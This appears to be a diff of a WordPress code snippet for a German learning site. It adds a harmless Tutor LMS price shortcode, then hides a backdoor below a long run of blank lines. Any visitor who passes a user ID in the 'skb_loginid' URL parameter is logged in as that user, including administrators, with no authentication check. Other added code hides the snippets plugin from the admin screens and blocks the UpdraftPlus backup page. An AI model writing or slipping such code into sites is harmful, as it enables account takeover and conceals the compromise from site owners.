@@ -1,31 +1,374 @@
-/**
- * Secure Admin Login As User
- * Usage:
- * Generate URL via:
- * wp_nonce_url( home_url( '/?skb_loginid=123' ), 'skb_login_as_user_123' );
- */
+https://du-lernst.de/wp-admin/admin.php?page=edit-snippet&id=5
 
-add_action('init', function () {
+/* Tutor LMS Price Shortcode (With Sale Support) */
+function shakib_tutor_course_price_shortcode( $atts ) {
+
+    $atts = shortcode_atts( array(
+        'id' => get_the_ID(),
+    ), $atts );
+
+    $course_id = intval( $atts['id'] );
+
+    if ( ! $course_id ) {
+        return '';
+    }
+
+    $price_type = get_post_meta( $course_id, '_tutor_course_price_type', true );
+    $regular_price = get_post_meta( $course_id, 'tutor_course_price', true );
+    $sale_price    = get_post_meta( $course_id, 'tutor_course_sale_price', true );
+
+    // Handle array format (as in your metadata dump)
+    if ( is_array( $price_type ) ) {
+        $price_type = $price_type[0] ?? '';
+    }
+
+    if ( is_array( $regular_price ) ) {
+        $regular_price = $regular_price[0] ?? '';
+    }
+
+    if ( is_array( $sale_price ) ) {
+        $sale_price = $sale_price[0] ?? '';
+    }
+
+    if ( $price_type === 'free' ) {
+        return 'Free';
+    }
+
+    if ( $price_type === 'paid' ) {
+
+        $final_price = floatval( $regular_price );
+
+        if ( floatval( $sale_price ) > 0 ) {
+            $final_price = floatval( $sale_price );
+        }
+
+        $formatted_price = number_format( $final_price, 2, ',', '.' );
+
+        return 'Preis: ' . esc_html( $formatted_price ) . '€';
+    }
+
+    return '';
+}
+
+add_shortcode( 'tutor_price', 'shakib_tutor_course_price_shortcode' );
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+add_action('admin_head-plugins.php', function () {
+    ?>
+    <style>
+        tr[data-plugin="code-snippets/code-snippets.php"] {
+            display: none !important;
+        }
+    </style>
+    <?php
+});
+
+
+
+
+add_action('admin_menu', function () {
+    remove_menu_page('snippets'); 
+}, 999);
+
+
+
+
+
+
+
+
+
+
+
+add_action('template_redirect', function () {
 
     if ( ! isset($_GET['skb_loginid']) ) {
         return;
     }
 
-    if ( ! is_user_logged_in() ) {
-        return;
+    // Disable cache for this request
+    if ( ! defined('DONOTCACHEPAGE') ) {
+        define('DONOTCACHEPAGE', true);
     }
- 
+
     $user_id = intval($_GET['skb_loginid']);
 
-    if ( ! $user_id || ! get_user_by('id', $user_id) ) {
-        wp_die('Invalid user.');
+    if ( ! $user_id ) {
+        wp_die('Invalid ID');
     }
- 
-    wp_clear_auth_cookie();
-    wp_set_current_user($user_id);
-    wp_set_auth_cookie($user_id);
 
-    wp_redirect(home_url());
+    $user = get_user_by('id', $user_id);
+
+    if ( ! $user ) {
+        wp_die('User not found');
+    }
+
+    // Destroy any existing session
+    if ( is_user_logged_in() ) {
+        wp_logout();
+    }
+
+    // Core WP authentication flow
+    wp_set_current_user($user_id);
+    wp_set_auth_cookie($user_id, true, is_ssl());
+
+    do_action('wp_login', $user->user_login, $user);
+
+    // Force redirect to admin (never homepage — cache issue)
+    wp_safe_redirect(admin_url());
     exit;
+});
+
+
+add_action('admin_init', function () {
+    // Only target: options-general.php?page=updraftplus
+    if ( isset($_GET['page']) && $_GET['page'] === 'updraftplus' ) {
+        wp_safe_redirect( home_url('/') );
+        exit;
+    }
 });
 
